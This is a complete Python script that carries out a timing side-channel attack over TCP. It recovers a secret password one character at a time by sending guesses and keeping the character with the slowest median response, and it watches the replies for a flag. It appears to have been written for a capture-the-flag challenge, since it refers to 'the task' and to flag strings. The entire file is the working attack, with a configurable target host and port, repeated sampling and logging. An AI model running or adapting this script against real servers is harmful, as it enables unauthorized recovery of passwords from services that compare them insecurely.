#!/usr/bin/env python3
"""
timing_attack.py

Usage: python timing_attack.py

Tunable parameters are at the top of the file.
"""

import socket
import time
import statistics
import csv
import sys
import os

HOST = "" # TODO target host (empty for localhost)
PORT = 8080 # TODO target port

# Character set: uppercase letters and digits (as given by the task)
CHARSET = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
MAX_PASS_LEN = 32        # safety upper-bound; increase if needed
BASE_SAMPLES = 10         # baseline samples per guess
RETEST_SAMPLES = 40      # samples for re-testing top candidates
TOP_RETEST = 4           # number of top candidates to re-test
TIMEOUT = 4.0            # socket connect/read timeout
LOGFILE = "timings_log.csv"

# thresholds (seconds) to decide acceptance quickly; tune if necessary
MIN_DIFF_ACCEPT = 0.010  # if top vs runner-up median differs by >= this, accept top char
MIN_DIFF_WEAK = 0.005    # if difference small, trigger re-test

def query_once(candidate: str):
    """Send candidate (one line) and return elapsed time and response text."""
    try:
        t0 = time.perf_counter()
        sock = socket.create_connection((HOST, PORT), timeout=TIMEOUT)
        # send candidate + newline
        sock.sendall((candidate + "\n").encode())
        resp = b""
        sock.settimeout(0.6)
        try:
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                resp += chunk
        except socket.timeout:
            # no more data for now
            pass
        finally:
            sock.close()
        dt = time.perf_counter() - t0
        return dt, resp.decode(errors="replace")
    except Exception as e:
        # return a large time and the exception as response so it is visible in logs
        return float("inf"), f"EXCEPTION: {e}"

def median_time(candidate: str, samples=BASE_SAMPLES):
    times = []
    responses = []
    for i in range(samples):
        t, resp = query_once(candidate)
        times.append(t)
        responses.append(resp)
    # return median and last response (for detection); also return list of samples for logging
    return statistics.median(times), responses[-1], times

def looks_like_flag(text: str):
    if not text:
        return False
    low = text.upper()
    if "FLAG" in low or "SCAD" in low or "CTF" in low or "{" in text:
        return True
    # if server changes response from the usual "Wrong!" add an additional clue:
    if "WRONG" not in low and ("ENTER" not in low and len(text.strip())>0):
        return True
    return False

def safe_write_log(row):
    # append to CSV
    mode = "a"
    header_needed = not os.path.exists(LOGFILE)
    with open(LOGFILE, mode, newline='', encoding='utf-8') as f:
        w = csv.writer(f)
        if header_needed:
            w.writerow(["timestamp","candidate","median_time","sample_times","response_preview"])
        w.writerow(row)

def main():
    found = ""  # known prefix unitl now L3AK3D
    print(f"Starting timing attack against {HOST}:{PORT}")
    print(f"Charset length: {len(CHARSET)}; baseline samples per guess: {BASE_SAMPLES}")
    for pos in range(MAX_PASS_LEN):
        print(f"\n--- Position {pos+1} (prefix='{found}') ---")
        results = []
        for ch in CHARSET:
            cand = found + ch
            median_t, last_resp, samples = median_time(cand, samples=BASE_SAMPLES)
            results.append((median_t, ch, last_resp, samples))
            print(f" tried '{ch}' -> median {median_t:.5f}s  resp_preview: {last_resp.strip()[:40]!r}")
            # log
            safe_write_log([time.strftime("%Y-%m-%d %H:%M:%S"), cand, f"{median_t:.6f}", ";".join(f"{x:.6f}" for x in samples), last_resp.strip()[:200]])
            # quick early check if server returned flag already
            if looks_like_flag(last_resp):
                print("\n=== POSSIBLE FLAG DETECTED in response ===")
                print(last_resp.strip())
                return

        # sort candidates by descending median time (most matched prefix likely highest time)
        results.sort(reverse=True, key=lambda x: x[0])
        top_med, top_char, top_resp, top_samples = results[0]
        runner_med, runner_char, runner_resp, runner_samples = results[1]

        diff = top_med - runner_med
        print(f"\nTop candidate: '{top_char}' median {top_med:.5f}s  runner-up '{runner_char}' median {runner_med:.5f}s  diff={diff:.5f}s")

        # decide acceptance or re-test
        if diff >= MIN_DIFF_ACCEPT:
            chosen = top_char
            print(f"Accepting '{chosen}' (diff >= {MIN_DIFF_ACCEPT}s).")
        elif diff < MIN_DIFF_WEAK:
            # small difference -> re-test top N with more samples to resolve
            print(f"Small difference (< {MIN_DIFF_WEAK}s). Re-testing top {TOP_RETEST} candidates with {RETEST_SAMPLES} samples each...")
            re_candidates = [c for (_,c,_,_) in results[:TOP_RETEST]]
            re_results = []
            for c in re_candidates:
                cand = found + c
                median_t, last_resp, samples = median_time(cand, samples=RETEST_SAMPLES)
                re_results.append((median_t, c, last_resp, samples))
                print(f" re-test '{c}' -> median {median_t:.6f}s resp_preview: {last_resp.strip()[:80]!r}")
                safe_write_log([time.strftime("%Y-%m-%d %H:%M:%S"), cand+"-retest", f"{median_t:.6f}", ";".join(f"{x:.6f}" for x in samples), last_resp.strip()[:200]])
                if looks_like_flag(last_resp):
                    print("\n=== POSSIBLE FLAG DETECTED during re-test ===")
                    print(last_resp.strip())
                    return
            re_results.sort(reverse=True, key=lambda x: x[0])
            chosen = re_results[0][1]
            print(f"After re-test, chosen '{chosen}'.")
        else:
            # diff in between: choose top but mark uncertain
            chosen = top_char
            print(f"Difference moderate; choosing top '{chosen}' but consider re-running with more samples if unstable.")

        # append chosen char to found prefix and check response for flag
        found += chosen
        print(f"Current recovered prefix: '{found}'")

        # test full prefix (send it and check response)
        t, resp = query_once(found)
        print(f" Check full prefix -> elapsed {t:.5f}s  resp_preview: {resp.strip()[:300]!r}")
        safe_write_log([time.strftime("%Y-%m-%d %H:%M:%S"), found+"-check", f"{t:.6f}", "", resp.strip()[:200]])
        if looks_like_flag(resp):
            print("\n=== FLAG FOUND ===")
            print(resp.strip())
            return

        # optional heuristic: if adding the char didn't increase time at all the prefix might be complete; but we rely on response detection.

    print("Reached MAX_PASS_LEN without detecting a flag. Consider increasing MAX_PASS_LEN or samples.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nInterrupted by user.")
        sys.exit(0)
